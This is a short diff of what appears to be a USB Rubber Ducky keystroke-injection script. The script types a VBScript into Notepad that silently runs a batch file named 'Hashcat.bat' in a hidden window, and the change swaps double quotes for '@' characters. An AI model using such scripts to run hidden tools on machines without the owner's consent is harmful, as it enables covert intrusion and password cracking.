@@ -51,11 +51,11 @@ STRING notepad.exe
 DELAY 100
 ENTER
 DELAY 500
-STRING Set WshShell = CreateObject("WScript.Shell")
+STRING Set WshShell = CreateObject(@WScript.Shell@)
 DELAY 100
 ENTER
 DELAY 100
-STRING WshShell.Run chr(34) & "Hashcat.bat" & Chr(34), 0
+STRING WshShell.Run chr(34) & @Hashcat.bat@ & Chr(34), 0
 DELAY 100
 ENTER
 DELAY 100
